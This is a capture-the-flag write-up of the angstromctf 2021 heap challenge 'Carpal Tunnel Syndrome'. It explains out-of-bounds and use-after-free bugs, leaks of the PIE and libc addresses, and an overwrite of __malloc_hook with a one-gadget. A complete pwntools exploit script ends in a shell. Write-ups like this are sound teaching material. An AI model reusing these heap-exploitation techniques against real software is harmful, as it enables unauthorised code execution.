**Carpal Tunnel Syndrome** was an interesting challenge from angstromctf 2021.

The program has all protections on (PIE,FULLRELRO,CANARY,etc…)

It’s a challenge in the form of a Bingo game.

First it asks you to choose a marker (0x18 bytes maxi) , that will be stored in .bss.

Then it shows a menu (looks like a heap challenge first) :

 --- Menu ---
1. -> Mark slot
2. -> View board
3. -> Reset row / column
4. -> Check specific index for bingo
5. -> Check for bingos
6. -> Change your marker
 
The program first allocate a « board » for the bingo game, 

a board of 5x5 squares, each square is a small buffer allocated with malloc(0x20)  (in tcache so..) 

and the libc used by the challenge is libc-2.31.

There is a var ‘root’ in .bss also, that points to the first square, 

that will be used by most functions, to move into the board (as a starting point)

**This is the structure of each 0x20 bytes (4 qwords) square :
**
* offset 0 :   empty first, then when you mark it, filled with the first qword of the choosen marker.
* Offset 8 :  pointer to next square at right (zero for the last)
* Offset 16 :  pointer to next square at bottom (zero for the last)
* Offset 24 :  pointer to a text (stored in .data section) that will be printed by View Board function.


**Here is a quick explanation of the various functions.**

1. Mark Slot , copy the first qword of the choosen marker, into the first qword of square buffer (mark it)

2 View a Square from Board (you choose x and y)

3 Reset a row or a column,  by just overwriting old squares, by 5 new allocated blocks (without freeing old ones first)

4 Checks a specific line or row, if the all the squares are fully marked.. (we did not use this one)

5 Check all board for bingos (row and columns) :

at the first full row or column it founds,  it proposes you to delete it, and will free the entire row or column (so free the 5 buffers).  

Then it will call the winner() function, that will ask for your name (and its length) for the hall of fame, and will allocate a block with malloc() of the size you want (the only 

malloc that you control entirely)

This block will never be freed.

6 . Change your marker content, with 0x18 bytes read by read() function on .bss




**I quickly spot some vulnerabilities :**

  first the Mark Slot() function, asks for x & y coordinates of the square you want to mark, but does not check if x and y are in range 0 to 4.. 
	so you can move ‘outside the board’

It does not check also, if the block has been already freed.

So it’s a use after free & out of bounds vulnerabilty..


The remove_bingo functions that free the buffer does no check also if the buffer are already freed, which could make a double free().

First we need a leak, cause the binary is PIE..

We mark first the last column (x = 4) with our marker.

Then we call check() function to delete it, that will call the winner() function.


The winner() function that is called when check() function find a full bingo row/column,

also permit to allocate a block of the size we want for the name, and will not empty the block allocated.

So if we asked the same size as a block previously freed by check(),  we can send as input a name shorter than the block size, to leak some heap pointers…

We can also leak pointers to the text in the last entry of the ancient block (+24), to leak .bss addresses..

And with that calculate prog base & .bss address.


First we will leak, a .bss address.

Then we mark the previous column (x = 3), and free it also.

Then we call check(),  and we again ask for a name of length 0x20 byte as the previously block freed by checks, but this time we will forge a fake block in name allocated block.

In this fake block, with our knowledge of .bss address, we will forge two fake « next block » pointers, the next bottom block pointer will point to ‘root’ pointer on .bss.

The text block pointer will point to puts .got entry just before .bss, in RO section.

This block will be allocated in place of square at pos (3,2) on the board.

So now we call View Board() function, with pos (3,2)  to dump puts .got entry, (in text)

and calculate the libc address. (libc base)


Now that we know .bss address & libc address.

We are going to abuse the linked list.. to overwrite pointer ‘root’ in .bss.


For this, we create a fake block in marker (a half one in fact, but we need just one linked list pointer)

And in the first qword of marker, we put the value we want to write over ‘root’ pointer.

Now, as we have forged a faked pointer in our name block at pos (3,2) with next block bottom pointer, pointing to ‘root’ on .bss.

We call Mark Slot() function, to write out marker first qword, onto ‘root’ pointer in .bss,

with Mark Slot at pos (3,3)


Now root, will point on our fake block in marker (on .bss)

And most of the function use ‘root’ pointer as the starting point, for moving into the board.

So they will all take our fake block in marker,  as the first block of the board.

In our fake ‘first block’, we set next block right pointer to ‘__malloc_hook’ in libc .

We call change_marker() function again, to set the first qword of marker,
to the address of one gadget in libc.


And we call mark_slot() function to write our marker to pos (1,0) ,  first next block right our fake ‘first block’ , so we overwrite ‘__malloc_hook’…

Ok now we’re done…

We just call reset() function to make a call to malloc() and launc our One Gadget..

And Bingo !!!

We Got Shell !!!

```python
from pwn import *
context.log_level = 'info'
context.arch = 'amd64'

host, port = "pwn.2021.chall.actf.co", "21840"
libc = ELF('./libc.so.6')

p = remote(host, port)

marker = "X"

def mark_slot(x, y):
    p.sendlineafter('Choice: ', '1')
    p.sendlineafter('space: ', '%d %d' % (x, y))

def view(x, y):
    p.sendlineafter('Choice: ', '2')
    p.sendlineafter('space: ', '%d %d' % (x, y))

def reset(index, rc):
    p.sendlineafter('Choice: ', '3')
    p.sendlineafter('reset: ', str(index))
    p.sendlineafter('olumn: ', rc)

def check_specific(index, rc):
    p.sendlineafter('Choice: ', '4')
    p.sendlineafter('check: ', str(index))
    p.sendlineafter('olumn: ', rc)

def check_bingos(delete=True, namelen=0, name=""):
    p.sendlineafter('Choice: ',  '5')
    res = p.recvline()

    if "bingo" in res:
        p.sendlineafter('? ', 'y' if delete else 'n')
        p.sendlineafter('name: ', str(namelen))
        p.sendafter('Name: ', name)

def change_marker(marker):
    p.sendlineafter('Choice: ', '6')
    p.sendafter('marker: ', marker)    

# set last column
p.sendlineafter('now: ', marker)
for i in range(5):
    mark_slot(4, i)

# first we leak a prog address to calculate prog_base
check_bingos(True, 0x20, 'p'*0x17+'q')
p.recvuntil('pq', drop=True)
prog_base = u64(p.recvuntil('!\n', drop=True).ljust(8,'\x00')) - 0x3230
log.success('prog leak: %s' % hex(prog_base))

# set another column (second from right to left)
for i in range(5):
   mark_slot(3, i)

# create false linked list entry pointing to .got libc entry, and with linked list pointer pointing to root
check_bingos(True, 0x20, p64(prog_base) + p64(0xdeadbeef) + p64(prog_base+0x5130) + p64(prog_base+0x4f80))

# leak the libc .got entry to calculate libc base
view(3,2)
p.readuntil(': ')
libc.address = u64(p.recvuntil('\n', drop=True).ljust(8,'\x00')) - 0x875a0
log.success('libc base: %s' % hex(libc.address))

# create fake linked list pointers (pointing to __malloc_hook) in marker & set root to marker
change_marker(p64(prog_base+0x5140) + p64(libc.symbols['__malloc_hook']) + p64(0xdeadbeef))
mark_slot(3, 3)

# change marker to one gadget address
onegadget = [0xe6c7e, 0xe6c81, 0xe6c84]
change_marker(p64(libc.address + onegadget[1]))
# write it to __malloc_hook
mark_slot(1,0)

# next malloc will give us SHELL
reset(0,'c')

p.interactive()

```
Nobodyisnobody for RootMeUpBeforeYouGoGo.
